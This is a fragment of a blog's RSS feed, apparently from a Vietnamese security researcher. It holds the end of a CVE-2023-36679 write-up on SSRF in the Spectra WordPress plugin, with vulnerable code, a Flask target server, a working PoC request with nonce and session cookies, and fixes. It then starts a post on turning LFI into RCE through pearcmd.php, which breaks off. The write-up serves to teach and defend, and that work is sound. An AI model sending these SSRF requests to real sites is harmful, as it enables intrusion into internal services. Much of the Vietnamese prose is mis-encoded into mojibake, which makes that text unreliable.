to√†n nguy c∆° &lt;strong&gt;SSRF&lt;/strong&gt; v√† tƒÉng t√≠nh an to√†n khi g·ªçi API t·ª´ ph√≠a m√°y ch·ªß.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;template_importer()&lt;/code&gt; y√™u c·∫ßu ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn t·ª´ &lt;strong&gt;Contributor&lt;/strong&gt; tr·ªü l√™n&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;X√°c th·ª±c nonce ch·ªëng csrf v·ªõi t√™n nonce l√† &lt;code&gt;_ajax_nonce&lt;/code&gt;, n·∫øu nonce kh√¥ng kh·ªõp =&amp;gt; tho√°t kh·ªèi logic v√† g·ª≠i l·ªói.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë y√™u c·∫ßu ƒë·∫∑c quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt;, n√™n gi√° tr·ªã &lt;code&gt;_ajax_nonce&lt;/code&gt; r·∫•t c√≥ kh·∫£ nƒÉng xu·∫•t hi·ªán trong m√£ ngu·ªìn giao di·ªán &lt;strong&gt;Admin&lt;/strong&gt;.&#xA;V·ªõi c√°c l·ªó h·ªïng li√™n quan t·ªõi quy·ªÅn Contributor th∆∞·ªùng g·∫Øn v·ªõi ch·ª©c nƒÉng t·∫°o b√†i vi·∫øt, b·∫°n c√≥ th·ªÉ t√¨m &lt;code&gt;_ajax_nonce&lt;/code&gt; b·∫±ng c√°ch inspect ph·∫ßn t·∫°o/s·ª≠a post trong trang qu·∫£n tr·ªã (ho·∫∑c t√¨m trong script/HTML m√† trang Admin sinh ra).&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/nonce.png&#34; title=&#34;_ajax_nonce trong response&#34; data-thumbnail=&#34;/posts/2025-10-23-cve-2023-36679/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;_ajax_nonce&lt;/h2&gt;&lt;p&gt;_ajax_nonce trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-23-cve-2023-36679/nonce.png&#39; alt=&#34;_ajax_nonce&#34; height=&#34;708&#34; width=&#34;1533&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;_ajax_nonce trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau c√°c b∆∞·ªõc x√°c th·ª±c, m√£ l·∫•y tr·ª±c ti·∫øp gi√° tr·ªã &lt;code&gt;api_uri&lt;/code&gt; t·ª´ &lt;code&gt;$_REQUEST&lt;/code&gt;, g·ªçi &lt;code&gt;esc_url_raw()&lt;/code&gt; r·ªìi gh√©p tham s·ªë truy v·∫•n v√† th·ª±c hi·ªán cu·ªôc g·ªçi HTTP b·∫±ng &lt;code&gt;wp_remote_get()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$api_uri = isset( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) ? esc_url_raw( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;$request_params = array( &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39; );&#xA;$demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;$response = wp_remote_get( $demo_api_uri, $api_args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cu·ªëi c√πng s·∫Ω decode response v√† tr·∫£ v·ªÅ d·∫°ng JSON v·ªõi key &lt;code&gt;original_content&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;template_importer()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_ast_block_templates_importer&amp;#39;, array( $this, &amp;#39;template_importer&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c, khi truy c·∫≠p endpoint &lt;code&gt;/wp-admin/admin-ajax/php&lt;/code&gt; v·ªõi &lt;code&gt;action=ast_block_templates_importer&lt;/code&gt; th√¨ &lt;code&gt;template_importer()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, jsonify, request, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/test&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;original_content&amp;#34;: &amp;#34;XNXX.COM&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o post v√† l·∫•y &lt;code&gt;_ajax_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi &lt;code&gt;api_uri&lt;/code&gt; tr·ªè ƒë·∫øn local service &lt;code&gt;http://127.0.0.1:8001/test&lt;/code&gt; b·∫±ng user &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7Cf3dc677b2e483f598ad00a36fbd2f18ed1ed5015b39fc2df533aeb573a8dc3fd; wp-settings-time-2=1761027443; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7C1e8333233a2233576e988302d4f19d5c92470de4cc2bf4c1e31fb65788a44d35&#xA;&#xA;action=ast_block_templates_importer&amp;amp;_ajax_nonce=3ef4c6d6df&amp;amp;api_uri=http://127.0.0.1:8001/test&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/result.png&#34; title=&#34;ƒê·ªçc n·ªôi dung t·ª´ local service&#34; data-thumbnail=&#34;/posts/2025-10-23-cve-2023-36679/result.png&#34; data-sub-html=&#34;&lt;h2&gt;result&lt;/h2&gt;&lt;p&gt;ƒê·ªçc n·ªôi dung t·ª´ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-23-cve-2023-36679/result.png&#39; alt=&#34;result&#34; height=&#34;523&#34; width=&#34;1524&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;ƒê·ªçc n·ªôi dung t·ª´ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phi√™n b·∫£n &lt;code&gt;‚â§ 2.6.6&lt;/code&gt; c·ªßa plugin &lt;code&gt;Spectra (Ultimate Addons for Gutenberg)&lt;/code&gt; t·ªìn t·∫°i l·ªó h·ªïng SSRF do s·ª≠ d·ª•ng &lt;code&gt;wp_remote_get()&lt;/code&gt; v·ªõi URL do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng gi·ªõi h·∫°n ho·∫∑c x√°c th·ª±c ngu·ªìn.&#xA;ƒêi·ªÅu n√†y cho ph√©p t√†i kho·∫£n c√≥ quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; g·ª≠i request t·ª´ m√°y ch·ªß WordPress ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng tin t∆∞·ªüng URL t·ª´ client, ch·ªâ d√πng d·ªØ li·ªáu c√≥ s·∫µn tr√™n server.&lt;/li&gt;&#xA;&lt;li&gt;∆Øu ti√™n d√πng &lt;strong&gt;&lt;code&gt;wp_safe_remote_get()&lt;/code&gt;&lt;/strong&gt; thay cho &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra ph·∫£n h·ªìi HTTP (status, MIME, n·ªôi dung).&lt;/li&gt;&#xA;&lt;li&gt;Gi·ªõi h·∫°n quy·ªÅn g·ªçi request ch·ªâ cho vai tr√≤ c·∫ßn thi·∫øt.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-addons-for-gutenberg/vulnerability/wordpress-spectra-plugin-2-6-6-server-side-request-forgery-ssrf-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Spectra Plugin &amp;lt;= 2.6.6 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Exploiting LFI2RCE Vulnerability via PHP PEARCMD</title>
      <link>http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/</link>
      <pubDate>Wed, 22 Oct 2025 20:48:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Xin ch√†o. Sau khi ph√¢n t√≠ch 10 CVE li√™n quan ƒë·∫øn LFI tr√™n c√°c plugin WordPress, t√¥i nh·∫≠n th·∫•y m·ªôt r√†o c·∫£n chung: nhi·ªÅu vector khai th√°c b·ªã gi·ªõi h·∫°n b·ªüi y√™u c·∫ßu &lt;strong&gt;ph·∫£i c√≥ h·∫≠u t·ªë &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt;. ƒêi·ªÅu n√†y l√†m gi·∫£m ƒë√°ng k·ªÉ kh·∫£ nƒÉng khai th√°c. Trong qu√° tr√¨nh t√¨m hi·ªÉu, t√¥i t√¨m th·∫•y b√†i vi·∫øt &lt;a href=&#34;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;docker-php-include-getshell&lt;/a&gt;. B√†i ƒë√≥ m√¥ t·∫£ c√°ch &lt;strong&gt;bypass r√†ng bu·ªôc &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt; b·∫±ng c√°ch l·ª£i d·ª•ng file &lt;code&gt;pearcmd.php&lt;/code&gt; v·ªën n·∫±m trong b·ªô c√¥ng c·ª• &lt;strong&gt;PECL&lt;/strong&gt;/&lt;strong&gt;PEAR&lt;/strong&gt; c·ªßa PHP v√† c√≥ s·∫µn trong m√¥i tr∆∞·ªùng WordPress ƒë∆∞·ª£c tri·ªÉn khai tr√™n Docker - m·ªôt m·∫πo r·∫•t th·ª±c t·∫ø cho k·ªãch b·∫£n kh√¥ng cho upload file.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;pear-v√†-pecl-l√†-g√¨&#34;&gt;&lt;span&gt;PEAR v√† PECL l√† g√¨?&lt;/span&gt;&#xA;  &lt;a href=&#34;#pear-v%c3%a0-pecl-l%c3%a0-g%c3%ac&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PECL (PHP Extension Community Library)&lt;/strong&gt;: c√¥ng c·ª• d√≤ng l·ªánh ƒë·ªÉ c√†i v√† qu·∫£n l√Ω extension PHP.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;PEAR (PHP Extension and Application Repository)&lt;/strong&gt;: th∆∞ vi·ªán n·ªÅn t·∫£ng cho PECL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tr∆∞·ªõc PHP &lt;code&gt;7.3&lt;/code&gt;, PEAR/PECL th∆∞·ªùng ƒë∆∞·ª£c c√†i m·∫∑c ƒë·ªãnh.&lt;br&gt;&#xA;T·ª´ PHP &lt;code&gt;7.4&lt;/code&gt; tr·ªü ƒëi, c·∫ßn bi√™n d·ªãch PHP v·ªõi &lt;code&gt;--with-pear&lt;/code&gt; ƒë·ªÉ c√≥ ch√∫ng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, trong c√°c Docker image PHP ch√≠nh th·ª©c, PEAR/PECL &lt;strong&gt;v·∫´n th∆∞·ªùng ƒë∆∞·ª£c c√†i s·∫µn&lt;/strong&gt;, n·∫±m ·ªü &lt;code&gt;/usr/local/lib/php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# ls /usr/local/lib/php&#xA;Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;pearcmdphp-v√†-register_argc_argv&#34;&gt;&lt;span&gt;&lt;code&gt;pearcmd.php&lt;/code&gt; v√† &lt;code&gt;register_argc_argv&lt;/code&gt;&lt;/span&gt;&#xA;  &lt;a href=&#34;#pearcmdphp-v%c3%a0-register_argc_argv&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;pearcmd.php&lt;/code&gt; l√† m·ªôt script PHP thi·∫øt k·∫ø ƒë·ªÉ ch·∫°y ·ªü ch·∫ø ƒë·ªô d√≤ng l·ªánh, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php /usr/local/lib/php/pearcmd.php install somepackage&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N√≥ x·ª≠ l√Ω c√°c tham s·ªë t·ª´ &lt;code&gt;$argv&lt;/code&gt; v√† &lt;code&gt;$argc&lt;/code&gt;. Khi ch·∫°y nh∆∞ CLI th√¨ d·ªØ li·ªáu n√†y r√µ 